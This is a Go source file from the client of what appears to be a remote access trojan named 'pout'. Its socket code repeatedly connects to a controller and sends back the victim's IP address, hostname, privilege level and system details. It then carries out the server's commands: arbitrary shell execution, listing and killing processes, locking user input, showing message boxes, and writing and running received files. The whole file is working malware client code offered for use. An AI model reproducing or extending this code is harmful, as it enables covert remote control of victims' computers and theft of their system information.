package socket

import (
	"bytes"
	"encoding/json"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/codeuk/pout/client/cmd/helper"
	"github.com/codeuk/pout/client/cmd/network"
	"github.com/codeuk/pout/client/cmd/system"
)

// `Message` represents a Message sent from the server to the client.
type Message struct {
	Header  byte   `json:"packet_header"`
	Content []byte `json:"message_content"`
}

// `Server` represents the socket server configuration settings.
type Server struct {
	Host string
	Port string
}

// `ClientSocket` represents a socket connection to the Server.
type ClientSocket struct {
	Parent   Server
	Conn     net.Conn
	MetaData system.MetaData
}

// `Connect` connects to the supplied Server and returns a pointer to a new ClientSocket instance.
// The function retries connecting with a backoff delay of CONTIMEOUT until the connection is established.
func Connect(server Server) *ClientSocket {
	// Create the server address string in the format "host:port".
	addr := server.Host + ":" + server.Port

	// Loop until a connection is established.
	for {
		// Attempt to connect to the server.
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			// If an error occurs, close the connection (if it was established) and retry after a delay.
			if conn != nil {
				conn.Close()
			}
			time.Sleep(CON_TIMEOUT)
			continue
		}

		// If the connection is established, return a new ClientSocket instance containing the connection.
		return &ClientSocket{
			Parent: server,
			Conn:   conn,
			MetaData: system.MetaData{
				IP:     network.GetIPAddress(),
				Name:   system.GetHostname(),
				Arch:   system.GetArchitecture(),
				Access: system.GetPrivilegeLevel(),
				System: system.GetSystemInformation(),

				// Message encryption has not been implemented.
				EncryptionKey: helper.EncryptionKey,
			},
		}
	}
}

// `ClientSocket.Listen` listens for incoming commands from the server and executes and sends their output back to the server.
// The method continues to listen for commands until it receives the "exit" command, at which point it closes the connection and exits the program.
func (client *ClientSocket) Listen() {
	// Serialize the MetaData into JSON format
	info, _ := json.Marshal(client.MetaData)

	// Send the serialized MetaData to the server
	client.SendBytes(info)

	// Continually listen for incoming commands from the server.
readLoop:
	for {
		var command, output Message

		// Read the incoming command from the server.
		command, err := client.ReadMessage()
		if command.Header == 0x00 {
			// Skip command handling if the header is invalid.
			continue
		}
		if err != nil {
			// Re-establish the connection.
			break readLoop
		}

	commandHandler:
		switch command.Header {

		case HD_EXIT:
			// Close the client socket connection and exit the program.
			client.Conn.Close()
			os.Exit(0)

		case HD_ERROR:
			// Break the packet reading loop and attempt to re-establish the connection.
			break readLoop

		case HD_PROCESSES:
			// Set packet header.
			output.Header = HD_PROCESSES

			// Get the systems running processes.
			output.Content, err = client.ExtractProcesses()
			if err != nil {
				output.Header = HD_ERROR
				output.Content = []byte(err.Error())
			}

		case HD_KILL_PROC:
			// Set packet header.
			output.Header = HD_KILL_PROC

			// Execute the taskkill command and send the output back to the server.
			output.Content, err = system.ExecuteShellCommand(string(command.Content))
			if err != nil {
				output.Header = HD_ERROR
				output.Content = []byte(err.Error())
			}

		case HD_MSG_BOX:
			var msgBox system.MessageBox

			// Set packet header.
			output.Header = HD_MSG_BOX

			// Deserialize the received data into a MessageBox struct.
			err = json.Unmarshal(command.Content, &msgBox)
			output.Content = []byte(strconv.FormatBool(err == nil))
			if err != nil {
				break commandHandler
			}

			// Display the message box(es).
			msgBox.Show()

		case HD_REMAKE:
			// Break the packet reading loop and restart the connection.
			break readLoop

		case HD_INPUT_OFF:
			// Set packet header.
			output.Header = HD_INPUT_OFF

			err := system.ToggleInputLocker(true)
			output.Content = []byte(strconv.FormatBool(err == nil))

		case HD_INPUT_ON:
			// Set packet header.
			output.Header = HD_INPUT_ON

			err := system.ToggleInputLocker(false)
			output.Content = []byte(strconv.FormatBool(err == nil))

		case HD_RUN_FILE:
			var file system.ClientFile

			// Set packet header.
			output.Header = HD_RUN_FILE

			// Deserialize the received data into a ClientFile struct.
			err = json.Unmarshal(command.Content, &file)
			output.Content = []byte(strconv.FormatBool(err == nil))
			if err != nil {
				break commandHandler
			}

			// Execute the recieved file content on the disk.
			go file.ExecuteOnDisk()

		default:
			// Set packet header.
			output.Header = HD_SHELL

			// Execute the shell command and send the output back to the server.
			output.Content, err = system.ExecuteShellCommand(string(command.Content))
			if err != nil {
				output.Header = HD_ERROR
				output.Content = []byte(err.Error())
			}
		}

		// Send the output commands header and output.
		client.SendMessage(output)
	}

	// Re-establish connection and update the client pointer to use the new connection.
	client.Conn.Close()
	time.Sleep(CON_TIMEOUT)
	newClient := Connect(client.Parent)
	newClient.Listen()
}

// `ClientSocket.ReadBytes` reads, deserializes and returns the incoming Message struct from the server.
func (client *ClientSocket) ReadMessage() (Message, error) {
	var message Message

	// Read the JSON Marshal from the server.
	messageBytesEnc, err := client.ReadAll()
	if err != nil {
		return message, err
	}

	// Decrypt the encrypted Message structs bytes.
	messageBytesDec, err := helper.Decrypt(messageBytesEnc)
	if err != nil {
		return message, err
	}

	// Deserialize the received data into a Message struct.
	err = json.Unmarshal(messageBytesDec, &message)

	return message, err
}

// `ClientSocket.ReadBytes` reads BUFFER amount of bytes from the server and returns it as an array of bytes.
func (client *ClientSocket) ReadBytes(requestBuffer int) ([]byte, error) {
	// Create a buffer to store the received data.
	data := make([]byte, requestBuffer)
	n, err := client.Conn.Read(data)
	if err != nil {
		return []byte{}, err
	}

	// Return the valid slice of the recieved data.
	return data[:n], nil
}

// `ClientSocket.ReadAll` reads all data from the server and returns it as an array of bytes.
func (client *ClientSocket) ReadAll() ([]byte, error) {
	var buf bytes.Buffer

	// Create a temporary buffer (size STD_BUFFER) to store the recieved data.
	tmp := make([]byte, 1024)
	for {
		// Read this iterations data chunk.
		n, err := client.Conn.Read(tmp)
		if err != nil {
			return []byte{}, err
		}

		// Write this iterations data chunk to the main buffer.
		buf.Write(tmp[:n])
		if n < len(tmp) {
			break
		}
	}

	return buf.Bytes(), nil
}

// `ClientSocket.SendMessage` serializes the passed Message and sends it to the server.
func (client *ClientSocket) SendMessage(message Message) error {
	// Serialize the Message into JSON format
	messageJson, _ := json.Marshal(message)

	// Encrypt the Message structs bytes.
	messageJsonEnc, err := helper.Encrypt(messageJson)
	if err != nil {
		return err
	}

	// Send the serialized and encrypted Message to the server.
	return client.SendBytes(messageJsonEnc)
}

// `ClientSocket.Send` sends the passed data to the server.
func (client *ClientSocket) SendBytes(data []byte) error {
	_, err := client.Conn.Write(data)

	return err
}

// Header packets for identifying the data recieved from the server.
const (
	HD_EXIT   byte = 0x10
	HD_REMAKE byte = 0x20
	HD_ERROR  byte = 0x30

	HD_SHELL     byte = 0x01
	HD_PROCESSES byte = 0x02
	HD_KILL_PROC byte = 0x03
	HD_MSG_BOX   byte = 0x04
	HD_INPUT_ON  byte = 0x05
	HD_INPUT_OFF byte = 0x06
	HD_RUN_FILE  byte = 0x07
)

// Wait times for when a timeout occurs.
const (
	CMD_TIMEOUT = time.Second * 3
	CON_TIMEOUT = time.Second * 5
)
